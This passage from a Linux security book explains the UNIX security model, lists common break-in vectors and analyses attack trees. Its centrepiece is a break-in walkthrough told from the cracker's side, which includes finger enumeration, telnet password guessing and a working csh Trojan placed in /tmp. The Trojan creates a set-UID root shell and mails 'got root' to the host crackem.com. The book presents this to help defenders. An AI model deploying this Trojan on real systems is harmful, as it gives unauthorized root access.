
- "Firewalls and the Corporate Moat" on page 67
- "Turn Off Unneeded Services" on page 80
- "High Security Requires Minimum Services" on page 87
- "Replace These Weak Doors with Brick" on page 88
- "New Lamps for Old" on page 97
- "United We Fall, Divided We Stand" on page 109

## 2.1 Understanding Linux Security

![](img/7d04225c75a86d3cf4bd6077596f35b2_33_0.png)

Some of the ideas behind Linux security are covered in this chapter, each as well as innovative new perspectives for viewing security. New ways will be considered to avoid the single "wall" of security that permits a single crack in that wall to void all security. Linux is based on the UNIX security model. This model was designed by some of the top Ph.D. computer scientists in the U.S. It has undergone 30 years of analysis, development, and evolution by everyone from noted scholars to crackers to Department of Defense and other government security experts. It has stood the test of time.

### 2.1.1 You Are in a Maze of Twisty Little Passages

A Linux system is a maze of twisty little passages, each with unknown connections and doors with locks of different strengths. The path to cracking a system may be long and twisty with many dead ends. This maze is shown in Figure 2.1.

As you can see in Figure 2.1, a cracker need find only one of many possible paths from the Internet to "owning" a system's root account or important database. The particular rooms offering unexpected paths in Figure 2.1 are, if any of them are broken into, the most frequent ways that Linux systems are compromised. If you notice any of these exist on your systems, you will want to read the appropriate sections of the book to ensure that the unexpected passages are blocked. These most severe vulnerabilities are also listed in Table 2.1. These problems and their solutions are discussed.

As you can see in Table 2.1, the most frequent avenues for breaking into a Linux box are common features in many sites. You can also see that many of the avenues are buggy system software or applications rather than a simple "misconfiguration" by the SysAdmin. This means that proper configuration of the system is not enough. You also need to be subscribed to the appropriate security mailing lists and work with your users and programmers to achieve a secure system. The following realistic example shows how a cracker might search for your system's vulnerabilities and take advantage of them to break in.

![](img/7d04225c75a86d3cf4bd6077596f35b2_34_0.png)

**Figure 2.1** You are in a maze of twisty little passages.

### Table 2.1 Most Frequent Linux Break-Ins

| Vulnerability Type | |
| :--- | :--- |
| Buggy or misconfigured DNS or Sendmail | Buggy or misconfigured FTP daemon |
| Buggy CGI programs or misconfigured Apache | Weak or missing passwords |
| NFS, mountd, or Sun Remote Procedure Calls | Buggy set-UID to root programs |
| Buggy or misconfigured POP or IMAP | Telnet |
| SNMP, especially with default passwords | |

If this example scares you, or if this might even work on your system, you have come to the right place for solutions. If this is elementary, please read ahead as there is something for everyone. (We will not even be trying CGI programs or buffer overflows in this example.)

> The inspiration for the title to this section is the computer game *Adventure*, where one explored an underground magical cave with many interconnected rooms. Many large old buildings, including castles, have similarly interconnected rooms and halls.

One possible path for a cracker to walk on a poorly secured system might be the following example. It is told from the perspective of the cracker to help understand the cracker's process in order to better protect against it.

1. We discover the hostname `www.pentacorp.com` by seeing a link to it from another site, or from seeing e-mail from it, or maybe by hearing the name Pentacorp.

2. Ping it to see if it exists.

```bash
$ ping www.pentacorp.com
PING www.pentacorp.com (216.247.56.62): 56 data bytes
64 bytes from 216.247.56.62: icmp_seq=0 ttl=55 time=189.4 ms
64 bytes from 216.247.56.62: icmp_seq=1 ttl=55 time=160.3 ms
```

> Because many sites are disabling the ICMP echo facility, `nslookup` or `traceroute` is more likely to yield valid results. Barring network failure, `nslookup` will always verify whether a site exists. The use of `traceroute` will test connectivity, and if there is a problem, will show which system is having the problem.

3. We see if it supports `finger`.

```bash
$ finger root@www.pentacorp.com
[www.pentacorp.com]
Login: root               Name: root
Directory: /root         Shell: /bin/tcsh
Last login Wed Apr 5 11:33 (EDT) on tty2
```

> The names Pentacorp and Fly-By-Day Consulting are trademarks of Fly-By-Day Consulting, Inc.

Yes, the SysAdmin made it easy by allowing us to see if the system administrator is on the system where he might notice us and by allowing us to guess account names without the guesses being reported.

4. Try guessing account names.

Because many people use their account names and usual host names for their e-mail addresses, crackers can obtain this information from e-mail, reading mailing lists and Newsgroups, and using Web search engines.

```bash
$ finger ken@research.pentacorp.com
finger: ken: no such user.
$ finger dennis@research.pentacorp.com
finger: dennis: no such user.
$ finger bill@research.pentacorp.com
[www.pentacorp.com]
Login: bill
Directory: /home/bill
On since Sat Apr 1 13:40 (EDT) on tty1
```

```text
Name: Bill Sateg
Shell: /bin/tcsh
Idle 6 days 16 hours
```

We found an account. Cool.

5. Guess Bill's password.

```bash
$ telnet www.pentacorp.com
Trying 192.168.57.8...
Connected to www.pentacorp.com
www.pentacorp.com login: bill
Password: money
Login incorrect
```

```text
www.pentacorp.com login: bill
Password: 640k
You have new mail.
```

We can log in as an ordinary user now.

6. Now try to become root. Try to guess root's password. Give up after 20 bad guesses to `su`. A dead end.

7. See if encrypted passwords are in `/etc/passwd`. If they are, we might crack them on our system.

```bash
% cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
ralph:x:101:100:daemon:/home/ralph:/bin/bash
bill:x:102:100:daemon:/home/bill:/bin/tcsh
```

Rats. The password field of "x" on root indicates that they are using shadowed passwords, contained in `/etc/shadow`. Another dead end.

8. See what root's `$PATH` variable says.

```bash
% cat /root/.bash_profile
alias rm='rm -i'
alias ls='ls --color -F'
export PATH=.:/usr/local/bin:$PATH
```

Wonderful. The SysAdmin includes `.` in his search path and in front of `/bin`. This means that if root gives the command `ls` and there is a program by that name in the current directory we are in, `/ls` will be executed instead of `/bin/ls`. This is a goof, a common one. (Another common error is to allow access to `/root` or even write access to it.)

9. Lay a trap in `/tmp` by leaving fake versions of `ls`, `favorite_editor`, and `other_editor` and wait for root to wander in there. We could fill up disk space deliberately by creating huge files, or we could create a script in `/tmp/ls` to get root to look in sooner.

```csh
% cat > /tmp/ls
#!/bin/csh -f
# If root, go directly to finish to give up ls
if (! -o root) goto finish
# Copy the shell
cp /bin/sh .sh
# Make it set-UID root!!!
chmod 4755 .sh
# Send us e-mail when it happens
hostname | mail -s "got root" crackem.com
# Remove the Trojan horses
/bin/rm ls pwd
finish:
/bin/ls *
^D
% chmod 755 /tmp/ls
% cp /tmp/ls /tmp/vi
```

> This environment variable lists what directories should be searched to find a command if there are no slashes in the command name.

> This code was written by the author, tested for correct operation, and copied to the manuscript as was almost all the code presented in the book.

### 2.1.2 Attack Paths

In the previous section you saw how a Linux or UNIX system might be considered a maze of twisty little passages. This might seem confusing and chaotic to people who have not studied Linux or UNIX security extensively.

Although this analogy compares Linux to a maze, it also holds for most other recent operating systems, including UNIX, Windows, Windows NT, and VMS.

You might have noted that it did not seem confusing or chaotic to our hypothetical cracker. This is because he understands the concept of attack paths and uses this analysis technique to find a route from where he is to where he wants to be, preferably having root access. It is valuable for you to be able to do this analysis before he does. The basic idea is that you start with a final objective, a root shell without needing physical presence at the computer.

You try to find the final portions of possible paths that will get you there and how "costly" each of these alternatives is. Cost may be the time to "walk" that path. It might be the cost, such as how powerful a computer is needed to crack a password in a reasonable amount of time or the cost to bribe someone into revealing the root password or even the cost to install a phone tap and connect a modem to it.

Next, the various paths to the starting points of these final segments are drawn and analyzed for costs. Next, the segments to get to these paths are devised and analyzed for costs. Eventually you go to starting points where you clearly can start from. Note that when drawn out these paths look very much like a tree, the living kind and file system trees. Finally you add the costs of all the segments for each possible path. These paths to root are shown in Figure 2.2.

As you see in Figure 2.2, this method of analysis shows the strengths and weaknesses, assuming you understand the components of the system well. The questions are:

1. Have you found all practical paths? This is the hardest question to answer.
2. Which are the easiest paths for crackers to follow?
3. Are any paths easy enough that they represent a significant risk of a break-in?
4. How can you eliminate these paths or make them harder for crackers to follow?
5. How can you force a cracker to go through a longer sequence of hard-to-do paths to increase security?

Bruce Schneier, CTO of Counterpane Internet Security and a noted security expert, published an article titled "Attack Trees" in the December 1999 issue of *Dr. Dobb's Journal*. His article provided some inspiration for this section.
